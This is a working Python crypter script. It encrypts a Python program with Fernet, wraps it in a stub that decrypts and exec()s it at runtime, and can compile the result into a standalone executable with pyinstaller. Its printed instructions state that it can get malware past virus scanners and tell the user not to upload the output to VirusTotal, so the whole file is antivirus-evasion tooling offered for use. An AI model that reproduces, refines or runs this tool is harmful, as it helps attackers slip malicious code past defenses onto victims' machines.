#!/bin/python3.9
import subprocess
import shlex
import base64
import re
from cryptography.fernet import Fernet

file_type = input("Python program or other type of file? (p/o): ")

if file_type == "p":

    print("\nEnter the name of a file to encrypt it.")
    print("\nIf the file isn't in the current directory, enter the full path.")
    print("\nThis can be used to get malware past some virus scanners.")
    print("\nDo not upload to virus total.")

    filename = input("\nEnter the name of the file you want to encrypt? ")
    modules_set = set()

    output_script = ''
    with open(filename, "r") as modules_file:
        modules = modules_file.read()
        import_files = re.findall(r"import\s+(\w+(\.\w+)*)+|from\s+(\w+(\.\w+)*)+\s+import\s+(\w+)(,\s*\w+)*", modules)
        for import_tuple in import_files:
            if import_tuple[0]:
                module_name = import_tuple[0]
                modules_set.add(module_name)
            else:
                module_name = import_tuple[2]
                imported_objects = import_tuple[3:]
                modules_set.add(module_name)

    for module_name in modules_set:
        if "," in module_name:
            objects_str = ",".join(imported_objects)
            output_script += f"from {module_name} import {objects_str}\n"
        else:
            output_script += f"import {module_name}\n"

    thefile = open(filename, "rb")
    data = thefile.read()
    print("File opened!!")

    key = Fernet.generate_key()
    encoded_key = base64.b64encode(key)

    payload_encrypted = Fernet(key).encrypt(data)

    text = f'''\
#!/bin/python3.9
{output_script}\
import base64
from cryptography.fernet import Fernet
payload = {payload_encrypted}
encoded_key = {encoded_key}
key = base64.b64decode(encoded_key)
payload_decrypted = Fernet(key).decrypt(payload)
exec(payload_decrypted)
    '''

    file_encrypted = input("What would you like to name your new file? ")
    with open(file_encrypted, "w") as thepayload:
        thepayload.write(text)
        print("File encrypted!!")

    cont = input("Would you like to compile an executable? (y/n) ")
    if cont == "y":
        cmd = f"pyinstaller --onefile {file_encrypted}"
        subprocess.call(shlex.split(cmd))
    elif cont == "n":
        exit()

elif file_type == "o":
    filename = input("Enter the name of the file you want encrypted: ")
    with open(filename, "rb") as thefile:
        contents = thefile.read()
        print("File opened!!")
        output_file = input("What would you like to save your encrypted file as? ")
        
        key = Fernet.generate_key()
        encoded_key = base64.b64encode(key)

        file_encrypted = Fernet(key).encrypt(contents)
    
        text = f'''\
#!/bin/python3
import base64
from cryptography.fernet import Fernet

file_encrypted = {file_encrypted}
encoded_key = {encoded_key}
key = base64.b64decode(encoded_key)
filename = "{filename}"
file_decrypted = Fernet(key).decrypt(file_encrypted)
with open(filename, "wb") as thefile:
    thefile.write(file_decrypted)
'''
        with open(output_file, "w") as encrypted_file:
            encrypted_file.write(text)
